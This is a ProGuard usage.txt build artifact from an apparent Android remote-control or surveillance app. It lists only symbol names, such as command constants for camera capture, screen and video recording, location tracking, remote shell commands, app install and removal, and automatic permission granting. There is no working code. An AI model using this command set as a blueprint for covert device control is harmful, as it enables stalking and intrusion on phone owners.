es/yy/6k/proguard/usage.txt
order.DataThreadInfo:
    public byte[] data
order.JobWakeUpService:
    private static final int JOB_WAKEUP_ID_ORDER
    private static final int JOB_WAKEUP_ID_CT
    private static final long JOB_WAKEUP_INTERVAL_ORDER
    private static final long JOB_WAKEUP_INTERVAL_CT
order.OrderService:
    private static final int MSG_ORDER
    private static final int MSG_DATA
    142:146:private void startAlarm()
    770:775:private void processLight()
    821:827:private void processLocation()
order.OrderService$OrderThread:
    496:497:public boolean isConnected()
order.Sock:
    private static final int DATA_SIZE
    120:120:public boolean SendPH()
order.file.FileUtils:
    public static final int BYTE
    public static final int KB
    public static final int MB
    public static final int GB
    18:18:public FileUtils()
    79:90:public static long getSDAllSizeKB()
    100:107:public static long getSDAvalibleSizeKB()
    118:118:public static long getFileSize(java.lang.String)
    129:140:public static long getFileSize(java.io.File)
    221:221:public static boolean isFileExists(java.lang.String)
    275:275:public static double getFileSize(java.lang.String,int)
order.file.ZipUtil
order.order:
    public static final int PID
    public static final int VER
    public static final int ENC
    public static final int CMD_TEST
    public static final int CMD_READY
    public static final int CMD_INFO
    public static final int CMD_CALL
    public static final int CMD_LOCK
    public static final int CMD_SHOT
    public static final int CMD_SHOTCODE
    public static final int CMD_RETURN
    public static final int CMD_POS
    public static final int CMD_LIGHT
    public static final int CMD_GIVE_POWER
    public static final int CMD_CAMERA
    public static final int CMD_SLIDE
    public static final int CMD_CMD
    public static final int CMD_GET_CMD_OUT
    public static final int CMD_REBOOT
    public static final int CMD_SHUTDOWN
    public static final int CMD_RESTART
    public static final int CMD_UNLOCK
    public static final int CMD_RECORD_SCREEN_START
    public static final int CMD_RECORD_SCREEN_END
    public static final int CMD_RECORD_VIDEO_START
    public static final int CMD_RECORD_VIDEO_END
    public static final int CMD_HOME
    public static final int CMD_GET_INSTALL_APP_INFO
    public static final int CMD_INSTALL_APP
    public static final int CMD_UNINSTALL_APP
    public static final int CMD_RUN_APP
    public static final int CMD_KILL_APP
    public static final int CMD_LONG_CLICK
    public static final int CMD_LOCATION_SINGLE
    public static final int CMD_LOCATION_SERIES
    public static final int CMD_LOCATION_STOP
order.screen.ScreenRecordActivity:
    private static final java.lang.String REQUEST_CODE
    public static final int REQUEST_SHOT_SCREEN
    public static final int REQUEST_RECORD_SCREEN
    public static final int REQUEST_MEDIA_PROJECTION
order.screen.ScreenRecordService:
    101:130:private android.media.MediaRecorder createMediaRecorder()
    134:136:private android.hardware.display.VirtualDisplay createVirtualDisplay()
    288:302:public void stop()
    307:307:public boolean isRecording()
order.screen.ScreenShotActivity:
    private static final java.lang.String REQUEST_CODE
    private static final java.lang.String COMPONENT_NAME
    public static final int REQUEST_MEDIA_PROJECTION
    public static final int REQUEST_MEDIA_DEVICE
    109:110:private void toast(java.lang.String)
    115:116:public static void startInstance(android.content.Context,int)
permission.GivePermission:
    private static final java.lang.String BUTTON_CLASS_NAME
    private static final java.lang.String CHECK_CLASS_NAME
    public static final java.lang.String WINDOW_NOTIFICATION_ACCESS_UI